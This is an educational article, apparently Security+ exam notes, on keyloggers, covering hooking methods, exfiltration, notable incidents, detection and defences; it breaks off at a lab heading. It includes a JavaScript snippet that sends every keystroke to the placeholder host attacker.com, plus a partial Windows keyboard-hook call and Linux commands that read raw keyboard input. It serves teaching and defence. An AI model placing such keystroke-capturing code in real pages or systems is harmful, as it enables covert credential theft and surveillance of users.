```markdown
---
domain: "cybersecurity/attacks"
tags: [keylogger, malware, credential-theft, surveillance, endpoint-security, spyware]
---
# Keyloggers

A **keylogger** (keystroke logger) is a type of **surveillance tool** or **malware** that records every keystroke made on a target device, enabling an attacker to silently capture passwords, credit card numbers, private messages, and other sensitive data. Keyloggers exist as both **software-based** and **hardware-based** variants, each with distinct deployment methods and detection profiles. They are closely related to [[spyware]], [[credential harvesting]], and [[man-in-the-browser attacks]], and are frequently deployed as components of larger [[Remote Access Trojans (RATs)]] or [[Advanced Persistent Threat (APT)]] toolchains.

---

## Overview

Keyloggers are among the oldest and most enduring tools in the attacker's arsenal, with documented use dating to the Cold War era when the KGB planted hardware keystroke interceptors inside IBM Selectric typewriters used in the U.S. Embassy in Moscow. Today, they remain highly relevant because they bypass encryption entirely — the attacker captures plaintext credentials *before* they are encrypted and transmitted, making even TLS-protected sites vulnerable to keylogging attacks on the endpoint.

The threat landscape for keyloggers is broad. Nation-state actors use custom keyloggers embedded in sophisticated implants (e.g., APT28's X-Agent/Sofacy platform included a keylogging module used against political targets during the 2016 U.S. election cycle). Cybercriminal groups deploy commodity keyloggers like HawkEye, Agent Tesla, and LokiBot through phishing campaigns to harvest banking credentials at scale. Insider threat actors may install hardware keyloggers on unattended workstations to steal credentials for later misuse.

From a legal standpoint, keyloggers occupy a gray area. Parental monitoring software, employee activity monitoring platforms, and penetration testing tools all may incorporate keystroke logging functionality. This dual-use nature makes detection and policy enforcement more nuanced — many enterprise Data Loss Prevention (DLP) solutions and endpoint security platforms must distinguish between authorized monitoring agents and malicious implants, often relying on signature databases, behavioral analysis, and deployment context.

Keyloggers serve as a pivotal enabler for lateral movement and privilege escalation. Once an attacker captures domain administrator credentials via keylogging on a compromised workstation, the entire network perimeter effectively collapses. This is why keylogger detection is considered a critical component of [[endpoint detection and response (EDR)]] solutions and why [[multi-factor authentication (MFA)]] is the most impactful single defensive control against the downstream effects of successful keystroke capture.

---

## How It Works

Keyloggers operate through fundamentally different mechanisms depending on whether they are software- or hardware-based. Understanding each layer is essential for both defense and exam readiness.

### Software Keyloggers

Software keyloggers intercept keystrokes at one of several layers in the operating system stack:

#### 1. User-Mode API Hooking (Windows)
The most common technique on Windows systems. The malware installs a **system-wide keyboard hook** using the `SetWindowsHookEx` Windows API function with the `WH_KEYBOARD_LL` (low-level keyboard) hook type.

```c
// Simplified example — attacker code concept
HHOOK hHook = SetWindowsHookEx(
    WH_KEYBOARD_LL,   // Low-level keyboard hook
    LowLevelKeyboardProc, // Callback function
    GetModuleHandle(NULL),
    0                 // Thread ID 0 = all threads (system-wide)
);
```

When any key is pressed anywhere on the system, Windows calls the registered callback *before* delivering the event to the target application. The callback logs the key and passes the event along with `CallNextHookEx()`, making the interception invisible to the user.

#### 2. Kernel-Mode / Driver-Based Keyloggers
More sophisticated and stealthy. A malicious kernel driver (`.sys` file on Windows, kernel module on Linux) registers as a keyboard filter driver in the device driver stack, intercepting `IRP_MJ_READ` requests from the keyboard device driver before they reach user-mode applications. These are significantly harder to detect as they operate below most security software.

On Linux, equivalent access can be achieved by:
```bash
# Reading raw keyboard events directly from the input device
# (requires root — attacker must have elevated privileges)
cat /dev/input/event0 | xxd
# or using evtest:
evtest /dev/input/event0
```

#### 3. Form Grabbing / Browser Hooking
Rather than hooking the OS keyboard subsystem, form grabbers hook browser-internal functions (e.g., `PR_Write` in Firefox's NSS library, or `HttpSendRequest` in Internet Explorer) to capture form data *after* the user fills it in but *before* it is submitted — this also captures data auto-filled by password managers, which raw keystroke loggers miss.

#### 4. JavaScript-Based Keyloggers
Delivered via Cross-Site Scripting ([[XSS]]) or malicious ad injection, these attach event listeners in the browser:

```javascript
// Malicious script injected into a web page
document.addEventListener('keydown', function(e) {
    fetch('https://attacker.com/log?k=' + encodeURIComponent(e.key), {
        method: 'GET',
        mode: 'no-cors'
    });
});
```

This captures keystrokes within the browser session and exfiltrates them to a remote collection server, often blending with legitimate analytics traffic.

#### 5. Acoustic / Electromagnetic Side-Channel (Advanced)
Research-grade attacks: different keys produce subtly different sound signatures when typed. Machine learning classifiers trained on recorded audio can reconstruct keystrokes with >90% accuracy (demonstrated by Asonov & Agrawal, 2004, and subsequent studies). Electromagnetic emanations from keyboards (Van Eck phreaking) offer a similar passive interception vector.

### Data Exfiltration
Captured keystrokes are typically:
- Written to an encrypted local log file, then exfiltrated on a schedule via HTTP POST, SMTP, or FTP to an attacker-controlled server
- Sent in real time via a reverse shell or C2 (Command and Control) channel embedded in the same RAT payload
- Stored locally on a hardware keylogger device for physical retrieval

### Hardware Keyloggers
Hardware keyloggers are physical devices inserted between the keyboard and the computer — typically a small USB or PS/2 passthrough dongle. They require no software installation and are completely invisible to the operating system. They have onboard flash storage (commonly 2–16 GB) and log all keystrokes until physically retrieved. Some advanced models include Wi-Fi chipsets to exfiltrate captured data wirelessly (e.g., KeySweeper, a proof-of-concept device built into a USB wall charger that captured Microsoft wireless keyboard transmissions over 2.4 GHz).

---

## Key Concepts

- **Hook-Based Keylogging**: A technique where software registers a callback function with the OS to intercept keyboard input events before they reach the target application, using APIs like `SetWindowsHookEx` (Windows) or `LD_PRELOAD` injection (Linux).
- **Kernel-Mode vs. User-Mode Keylogger**: Kernel-mode keyloggers operate as device drivers with ring-0 privileges, making them invisible to user-space security tools; user-mode keyloggers are easier to deploy but more readily detected by EDR and antivirus.
- **Form Grabber**: A variant of keylogger that intercepts web form submission data (including auto-filled fields) directly from browser memory or network stacks, capturing credentials that a raw keystroke logger might miss due to password manager autofill.
- **Hardware Keylogger**: A physical passthrough device placed between keyboard and computer that logs all keystrokes in onboard memory without requiring any OS-level access, making it undetectable by any software security tool.
- **C2 Exfiltration**: The mechanism by which keylogged data is sent back to the attacker — common channels include HTTP/S beaconing to a command-and-control server, email (SMTP), FTP, or DNS tunneling to evade egress filtering.
- **Acoustic Side-Channel Attack**: An advanced keylogging technique that reconstructs keystrokes from the sound of key presses using audio recordings and machine learning, requiring no physical access to the target machine.
- **Anti-Keylogging**: Techniques used by security software or users to defeat keyloggers — including virtual keyboards, randomized input fields, one-time pads, and behavioral analysis to detect hooking activity.

---

## Exam Relevance

**SY0-701 Domain Mapping**: Keyloggers appear primarily under **Domain 2.0 — Threats, Vulnerabilities, and Mitigations** (specifically 2.4: "Given a scenario, analyze indicators of malicious activity") and **Domain 4.0 — Security Operations**.

**Common Question Patterns:**

- **Classification questions**: The exam frequently asks you to classify a keylogger correctly. It is a form of **spyware** (captures data without user consent), which is a subcategory of **malware**. Do not confuse it with adware (displays ads) or ransomware (encrypts data).
- **Hardware vs. Software**: Expect a scenario where an employee suspects someone installed a keylogger. If the scenario mentions *physical access to the workstation*, the correct answer often involves checking for a **hardware keylogger** plugged into a USB or PS/2 port — because software scans won't find it.
- **MFA as the mitigation**: The exam loves asking what *best mitigates* a successful keylogging attack. The answer is **multi-factor authentication** — because even if the attacker captures a password, they cannot satisfy the second factor without the physical token or biometric.
- **Indicator of compromise**: The exam may describe unusual outbound traffic on port 25 (SMTP) or periodic small HTTP POST requests to unknown hosts as indicators consistent with keylogger exfiltration.
- **Gotcha — Legitimate vs. Malicious**: The exam may reference "monitoring software" in a corporate context. If it's *authorized and disclosed*, it is not malware under the CompTIA framework. If unauthorized, it is spyware/keylogger regardless of the tool used.

**Key Terms to Know Cold**: `WH_KEYBOARD_LL`, hook injection, form grabber, hardware keylogger, spyware classification, C2 beaconing, anti-keylogging (virtual keyboard).

---

## Security Implications

### Attack Vectors
- **Phishing / Malspam**: The dominant delivery vector. Commodity keyloggers like **Agent Tesla**, **HawkEye**, and **FormBook** are distributed via malicious Office macros or weaponized PDF attachments. Agent Tesla, for example, was observed in over 6,000 malicious campaigns in 2020–2022 and exfiltrates data via SMTP and Telegram.
- **Drive-by Downloads**: Malicious websites exploit unpatched browser vulnerabilities to silently install keylogger payloads.
- **Physical Access (Insider Threat)**: A malicious insider or physical intruder inserts a hardware keylogger (e.g., a KeyGrabber USB device, commercially available for ~$30–$100) into an unattended workstation before it is locked.
- **Trojanized Software**: Keyloggers embedded in pirated software, fake system utilities, or compromised software supply chains.

### Notable Incidents and CVEs
- **APT28 / Fancy Bear**: Used the *X-Agent* implant (also called *Sofacy*) which included a keylogging module. Deployed against the Democratic National Committee (2016), Ukrainian military targeting via Android (2014–2016).
- **Operation Aurora (2009–2010)**: Google and other major companies were targeted; the implants used in the campaign included keylogging modules to harvest employee credentials for lateral movement.
- **CVE-2017-0199**: A Microsoft Office OLE vulnerability heavily exploited to deliver keylogger payloads including Agent Tesla via phishing documents.
- **KeySweeper**: Developed by Samy Kamkar, this proof-of-concept hardware implant disguised as a USB wall charger passively sniffed and decoded keystrokes from nearby Microsoft wireless keyboards, demonstrating RF-based keylogging without physical contact with the target machine.

### Detection Indicators
- Unexpected processes with `SetWindowsHookEx` calls visible in process monitors (Sysinternals Process Monitor)
- Unknown keyboard filter drivers in Device Manager
- Suspicious outbound connections on ports 25 (SMTP), 587, 21 (FTP), or periodic small HTTP POST requests
- Unusual `.dat` or `.log` files in `%APPDATA%`, `%TEMP%`, or `C:\Windows\Temp`
- Anti-debugging or process injection techniques detected by EDR behavioral engines

---

## Defensive Measures

### Technical Controls

1. **Multi-Factor Authentication (MFA)**: Deploy MFA on all critical systems (VPN, email, admin consoles, cloud services). Even if credentials are captured, the attacker cannot use them without the second factor. Use FIDO2/WebAuthn hardware tokens (YubiKey) where possible — they are phishing- and keylogging-resistant by design.

2. **Endpoint Detection and Response (EDR)**: Deploy an EDR solution (e.g., CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne) configured to detect API hooking, process injection, and suspicious keyboard hook registrations. EDR behavioral engines specifically look for `SetWindowsHookEx(WH_KEYBOARD_LL, ...)` calls from non-whitelisted processes.

3. **Application Whitelisting**: Use Windows Defender Application Control (WDAC) or AppLocker to prevent unauthorized executables from running, blocking most commodity keylogger payloads that require execution.

4. **Kernel-Mode Code Signing (KMCS)**: On modern Windows systems (64-bit), all kernel drivers must be digitally signed by Microsoft. Enable **Secure Boot** and **Driver Signature Enforcement** to prevent unsigned keylogger drivers from loading.
   ```powershell
   # Verify Secure Boot status
   Confirm-SecureBootUEFI
   # Check code integrity policy
   Get-CIPolicy -FilePath C:\Windows\System32\CodeIntegrity\SiPolicy.p7b
   ```

5. **Virtual Keyboards / On-Screen Keyboard**: For high-sensitivity inputs (banking, admin portals), use a virtual/on-screen keyboard (Windows: `osk.exe`) — this bypasses many hook-based keyloggers since keystrokes are delivered via mouse click events, not keyboard device driver calls. Note: advanced keyloggers counter this with screenshot capture.

6. **Physical Security**: Enforce clean-desk policies. Lock workstations when unattended (`Win+L`). Inspect USB and PS/2 ports on high-value workstations periodically. Use **port blockers** or disable unused USB ports via Group Policy or BIOS settings.
   ```powershell
   # Disable USB storage via Group Policy (does not affect keyboards, but reduces physical attack surface)
   Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\USBSTOR" -Name "Start" -Value 4
   ```

7. **Network Egress Filtering**: Block outbound SMTP (port 25) from non-mail servers. Implement DNS filtering (e.g., Pi-hole, Cisco Umbrella) to block known C2 domains. Use a next-generation firewall with application inspection to detect anomalous data exfiltration patterns.

8. **Privileged Access Workstations (PAWs)**: Administer sensitive systems only from dedicated, hardened workstations that never browse the web or receive email — eliminating the primary delivery vectors for software keyloggers.

### Policy and Process Controls
- **Security Awareness Training**: Train users to recognize phishing emails, the primary delivery vector for software keyloggers. Simulate phishing campaigns quarterly.
- **Acceptable Use Policy (AUP)**: Define clear policies on personal device use and software installation to reduce insider threat and accidental installation of keylogger-containing software.
- **Periodic Physical Inspection**: Include hardware keylogger inspection as part of regular physical security audits for high-value workstations (executive offices, server rooms, reception terminals).

---

## Lab / Hands-On

> ⚠️ **Legal Warning**: The following exercises must only be performed on systems you own or have explicit written authorization to test. Deploying keyloggers on systems without authorization is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent laws worldwide.

### Lab 1: Observe Hook-Based Keylogging with Sy